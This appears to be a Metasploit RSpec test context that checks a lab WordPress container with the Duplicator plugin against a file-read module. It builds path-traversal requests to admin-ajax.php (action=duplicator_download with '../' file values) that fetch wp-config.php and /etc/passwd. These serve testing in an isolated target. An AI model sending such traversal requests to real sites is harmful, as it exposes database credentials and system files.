# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'
require_relative 'profiles'

RSpec.shared_context 'native Duplicator target' do
  include_context 'module target'

  before(:all) do
    @duplicator_profile = DuplicatorProfiles.fetch
    @duplicator_native = { requests: [], commands: [], calls: [] }
    begin
      duplicator_counters('before')
      if @duplicator_profile.fetch('mode') == 'unrelated'
        response = duplicator_request('/')
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-http-marker')
      else
        @duplicator_baseline = duplicator_identity
        expect(@duplicator_baseline.slice('core', 'php', 'uid')).to eq(DuplicatorProfiles::RUNTIME)
        expect(@duplicator_baseline.values_at('sapi', 'prefix')).to eq(['cli', @duplicator_profile.fetch('prefix')])
        expect(@duplicator_baseline.fetch('active')).to eq(!@duplicator_profile.fetch('release').nil?)
        expect(@duplicator_baseline.fetch('plugin_version')).to eq(@duplicator_profile.fetch('release'))
        expect(duplicator_request("#{duplicator_prefix}/wp-login.php").body).to include('name="log"', 'name="pwd"')
        if @duplicator_profile.fetch('release')
          release = DuplicatorProfiles::RELEASES.fetch(@duplicator_profile.fetch('release'))
          expect(@duplicator_baseline.values_at('archive_sha256', 'installed_sha256')).to eq(release.values_at('sha256', 'installed_sha256'))
          expect(@duplicator_baseline.fetch('active_plugins')).to eq(['duplicator/duplicator.php'])
          expect(@duplicator_baseline.fetch('package_table_exists')).to be(true)
          expect(duplicator_request("#{duplicator_prefix}/wp-content/plugins/duplicator/readme.txt").body).to include("Stable tag: #{@duplicator_profile.fetch('release')}")
          DuplicatorProfiles::FILES.each do |name, fixture|
            actual = @duplicator_baseline.fetch('files').fetch(fixture.fetch('path'))
            response = duplicator_file_request(fixture.fetch('path'))
            expect(response.code).to eq('200')
            if @duplicator_profile.fetch('mode') == 'affected' && !%w[quoted missing].include?(name)
              expect(response.body.to_s.b).to eq(Base64.strict_decode64(actual.fetch('content_base64')))
              expect(response['content-type']).to eq('application/octet-stream')
              expect(response['content-disposition']).to include('attachment; filename=')
            elsif @duplicator_profile.fetch('mode') == 'affected'
              expect(response.body).to eq('Invalid installer file name!!')
              expect(response['content-disposition']).to be_nil
            else
              expect(response.body).to eq('Invalid request')
              expect(response['content-disposition']).to be_nil
            end
          end
          if @duplicator_profile.fetch('mode') == 'fixed'
            package = @duplicator_baseline.fetch('package_control')
            row = @duplicator_baseline.fetch('package_row')
            expect(row.values_at('id', 'hash')).to eq([package.fetch('id').to_s, package.fetch('hash')])
            query = URI.encode_www_form(package.slice('id', 'hash', 'file'))
            response = duplicator_request("#{duplicator_prefix}/wp-admin/admin-ajax.php?action=duplicator_download&#{query}")
            expect(response.code).to eq('200')
            expect(response['content-disposition']).to include('attachment; filename=')
            expect(Digest::SHA256.hexdigest(response.body.to_s.b)).to eq(@duplicator_baseline.fetch('files').fetch(package.fetch('path')).fetch('sha256'))
          end
          if @duplicator_profile.fetch('mode') == 'affected'
            config = @duplicator_baseline.fetch('config_path')
            expect(Digest::SHA256.hexdigest(duplicator_file_request('wp-config.php', depth: 1).body.to_s.b)).to eq(@duplicator_baseline.fetch('files').fetch(config).fetch('sha256'))
            backup = @duplicator_baseline.fetch('backup_path')
            expect(Digest::SHA256.hexdigest(duplicator_file_request('module-target-backup.txt', depth: 0).body.to_s.b)).to eq(@duplicator_baseline.fetch('files').fetch(backup).fetch('sha256'))
            expect(duplicator_file_request('/etc/passwd', depth: 0).body).to eq('Invalid installer file name!!')
          end
        else
          expect(@duplicator_baseline.fetch('active_plugins')).to eq([])
          expect(duplicator_request("#{duplicator_prefix}/wp-content/plugins/duplicator/readme.txt").code).to eq('404')
          denied = duplicator_file_request('/etc/passwd')
          expect(denied.code).to eq('400')
          expect(denied.body).to eq('0')
        end
        expect(duplicator_identity).to eq(@duplicator_baseline)
      end
      provenance = console_command('irb -e \'puts "DUPLICATOR_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_duplicator_file_read.rb").hexdigest}.to_json\'')
      values = JSON.parse(provenance.match(/^DUPLICATOR_PROVENANCE=(.+)$/)[1])
      expect(values.fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(values.fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_duplicator_file_read.rb').hexdigest)
      @duplicator_native[:provenance] = values
      @duplicator_native[:preflight] = 'passed'
    ensure
      duplicator_save
    end
  end

  after(:all) do
    expect(duplicator_identity).to eq(@duplicator_baseline) if @duplicator_baseline
    expect(console_command('irb -e \'puts "DUPLICATOR_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('DUPLICATOR_STATE={"sessions":[],"jobs":[]}')
  ensure
    duplicator_counters('after')
    duplicator_save
  end

  def duplicator_prefix
    @duplicator_profile.fetch('prefix')
  end

  def duplicator_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-duplicator.json'), JSON.pretty_generate(@duplicator_native)) if @duplicator_native
  end

  def duplicator_identity
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', 'www-data', 'app', 'timeout', '20', 'php', '/opt/module-target/control.php']
    output, error, status = Open3.capture3(*argv)
    @duplicator_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    duplicator_save
    raise "Native Duplicator inspection failed: #{error}" unless status.success?

    JSON.parse(output)
  end

  def duplicator_request(path)
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    response = http.request(Net::HTTP::Get.new(path))
    @duplicator_native.fetch(:requests) << { path: path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    duplicator_save
    response
  end

  def duplicator_file_request(path, depth: @duplicator_profile.fetch('depth'), base_path: duplicator_prefix)
    query = URI.encode_www_form('action' => 'duplicator_download', 'file' => ('../' * depth) + path.delete_prefix('/'))
    duplicator_request("#{base_path}/wp-admin/admin-ajax.php?#{query}")
  end

  def duplicator_loots
    Dir[File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')].select { |path| File.file?(path) }
  end

  def duplicator_owner(options = {}, action: 'run')
    output = run_target_module(DuplicatorProfiles::OWNER, 'app', {
      'SSL' => false, 'TARGETURI' => "#{duplicator_prefix}/", 'DEPTH' => @duplicator_profile.fetch('depth'), 'THREADS' => 1, 'HttpClientTimeout' => 5
    }.merge(options), action: action, allow_errors: true)
    @duplicator_native.fetch(:calls) << { action: action, options: options, output_base64: Base64.strict_encode64(output.b) }
    duplicator_save
    output
  end

  def duplicator_download(path, options = {})
    before = duplicator_loots
    output = duplicator_owner({ 'FILEPATH' => path }.merge(options))
    loots = duplicator_loots - before
    expect(loots.length).to eq(1), output.dup.force_encoding(Encoding::UTF_8).scrub
    actual_path = case path
                  when 'wp-config.php' then @duplicator_baseline.fetch('config_path')
                  when 'module-target-backup.txt' then @duplicator_baseline.fetch('backup_path')
                  else '/' + path.delete_prefix('/')
                  end
    expected = @duplicator_baseline.fetch('files').fetch(actual_path)
    expect([File.size(loots.first), Digest::SHA256.file(loots.first).hexdigest]).to eq(expected.values_at('size', 'sha256'))
    expect(output).to include('File saved in:')
    expect(output.b).to include(loots.first.b)
  end

  def duplicator_refuse(options = {}, action: 'run')
    before = duplicator_loots
    output = duplicator_owner(options, action: action)
    expect(duplicator_loots).to eq(before)
    expect(output).not_to include('File saved in:')
    expect(output).not_to include('This module does not support check.') if action == 'check'
    output
  end

  def duplicator_counters(phase)
    roles = @duplicator_profile.fetch('mode') == 'unrelated' ? ['app'] : %w[app db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "duplicator-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
